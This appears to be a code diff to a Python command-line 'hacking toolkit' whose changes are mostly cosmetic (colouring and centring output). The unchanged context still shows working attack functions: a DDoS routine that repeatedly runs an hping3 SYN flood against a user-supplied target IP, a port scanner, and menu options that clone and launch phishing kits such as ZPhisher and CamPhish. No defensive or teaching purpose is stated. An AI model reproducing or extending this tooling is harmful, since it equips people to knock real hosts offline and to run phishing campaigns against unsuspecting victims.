@@ -25,10 +25,10 @@ def center_text(text):
     return "\n".join(centered_lines)
 
 def print_centered(text):
-    print(center_text(text))
+    print(center_text(Fore.RED + text + Style.RESET_ALL))
 
 # ASCII Art Logo
-logo = Fore.RED + """
+logo = """
 ┳┳┓┏┓┏┓┏┓┏┓  ┏┓┓ ┳┏┓┳┓┏┳┓
 ┃┃┃┏┛┏┛┏┛┃┃  ┃ ┃ ┃┣ ┃┃ ┃ 
   ┛ ┗┗┛┗┛┗┛┗┻  ┗┛┗┛┻┗┛┛┗ ┻ v2
@@ -39,11 +39,15 @@ and iamgeo1
 # Function to clone and run a git repository
 def clone_and_run(repo_url, dir_name):
     if not os.path.exists(dir_name):
-        print(Fore.YELLOW + f"Cloning {repo_url}..." + Style.RESET_ALL)
+        print_centered(f"Cloning {repo_url}...")
         subprocess.run(['git', 'clone', repo_url])
     
     os.chdir(dir_name)
-    subprocess.run(['bash', 'start.sh'])  # Assuming a start.sh script exists to run the tool
+    # Assuming there's a start.sh or similar script to run the tool
+    if os.path.isfile('start.sh'):
+        subprocess.run(['bash', 'start.sh'])
+    else:
+        print_centered("No start.sh file found. Please check the repository.")
     os.chdir('..')  # Change back to the original directory
 
 # DDoS Functionality
@@ -54,16 +58,16 @@ def ddos_function():
 ┃┃┃┃┏┓┗┓  ┣┫ ┃  ┃ ┣┫┃ ┃┫ 
 ┻┛┻┛┗┛┗┛  ┛┗ ┻  ┻ ┛┗┗┛┛┗┛
     """
-    print(Fore.GREEN + ddos_art + Style.RESET_ALL)
-    target_ip = input(Fore.RED + "Target IP: ")
-    duration = int(input(Fore.YELLOW + "Duration in seconds: "))
+    print_centered(ddos_art)
+    target_ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL)
+    duration = int(input(Fore.YELLOW + "Duration in seconds: " + Style.RESET_ALL))
 
-    print("Starting DDoS attack...")
+    print_centered("Starting DDoS attack...")
     end_time = time.time() + duration
 
     while time.time() < end_time:
         subprocess.run(['hping3', '--flood', '-S', target_ip])
-    print("DDoS attack finished.")
+    print_centered("DDoS attack finished.")
     wait_for_user()
 
 # Port Scanner Functionality
@@ -74,12 +78,12 @@ def port_scanner():
 ┃┃┃┃┣┫ ┃   ┗┓┃ ┣┫┃┃┃┃┣ ┣┫
 ┣┛┗┛┛┗ ┻   ┗┛┗┛┛┗┛┗┛┗┗┛┛┗
     """
-    print(Fore.GREEN + port_scanner_art + Style.RESET_ALL)
+    print_centered(port_scanner_art)
     print(Fore.LIGHTGREEN_EX + "Port Scanner" + Style.RESET_ALL)
     
-    target_ip = input(Fore.RED + "Target IP: ")
-    start_port = int(input(Fore.YELLOW + "Start Port: "))
-    end_port = int(input(Fore.YELLOW + "End Port: "))
+    target_ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL)
+    start_port = int(input(Fore.YELLOW + "Start Port: " + Style.RESET_ALL))
+    end_port = int(input(Fore.YELLOW + "End Port: " + Style.RESET_ALL))
 
     for port in range(start_port, end_port + 1):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -88,9 +92,9 @@ def port_scanner():
         result = sock.connect_ex((target_ip, port))
         
         if result == 0:
-            print(f"Port {port} is open")
+            print(Fore.GREEN + f"Port {port} is open" + Style.RESET_ALL)
         else:
-            print(f"Port {port} is closed")
+            print(Fore.RED + f"Port {port} is closed" + Style.RESET_ALL)
         
         sock.close()
 
@@ -206,30 +210,30 @@ class IPToolkit:
             return json.dumps({"Error": message}, indent=4)
 
 def wait_for_user():
-    input(Fore.GREEN + "Press Enter to continue..." + Style.RESET_ALL)
+    input(Fore.RED + "Press Enter to continue..." + Style.RESET_ALL)
 
 def main_menu():
     clear_console()
     print_centered(logo)
     
     while True:
-        print(Fore.LIGHTGREEN_EX + "Select an option:" + Style.RESET_ALL)
-        print("1. IP Toolkit")
-        print("2. MaskPhish")
-        print("3. ZPhisher")
-        print("4. CamPhish")
-        print("5. DDoS Attack")
-        print("6. Port Scanner")
-        print("7. Exit")
+        print_centered("Select an option:")
+        print_centered("1. IP Toolkit")
+        print_centered("2. MaskPhish")
+        print_centered("3. ZPhisher")
+        print_centered("4. CamPhish")
+        print_centered("5. DDoS Attack")
+        print_centered("6. Port Scanner")
+        print_centered("7. Exit")
 
-        choice = input(Fore.YELLOW + "Enter choice: " + Style.RESET_ALL)
+        choice = input(Fore.RED + "Enter choice: " + Style.RESET_ALL)
 
         if choice == "1":
             toolkit = IPToolkit()
-            print(Fore.BLUE + "Local IP: " + toolkit.get_local_ip())
-            print(Fore.BLUE + "Public IP: " + toolkit.get_public_ip())
-            ip_to_geo = input(Fore.GREEN + "Enter IP to get geolocation: " + Style.RESET_ALL)
-            print(Fore.BLUE + "Geolocation Info: " + toolkit.ip_geolocation(ip_to_geo))
+            print_centered("Local IP: " + toolkit.get_local_ip())
+            print_centered("Public IP: " + toolkit.get_public_ip())
+            ip_to_geo = input(Fore.RED + "Enter IP to get geolocation: " + Style.RESET_ALL)
+            print_centered("Geolocation Info: " + toolkit.ip_geolocation(ip_to_geo))
 
         elif choice == "2":
             clone_and_run("https://github.com/yourusername/maskphish.git", "maskphish")
@@ -247,12 +251,13 @@ def main_menu():
             port_scanner()
 
         elif choice == "7":
-            print(Fore.RED + "Exiting..." + Style.RESET_ALL)
+            print_centered("Exiting...")
             break
 
         else:
-            print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
+            print_centered("Invalid choice. Please try again.")
 
 if __name__ == "__main__":
     start_server_thread()  # Start the HTTP server
     main_menu()
+
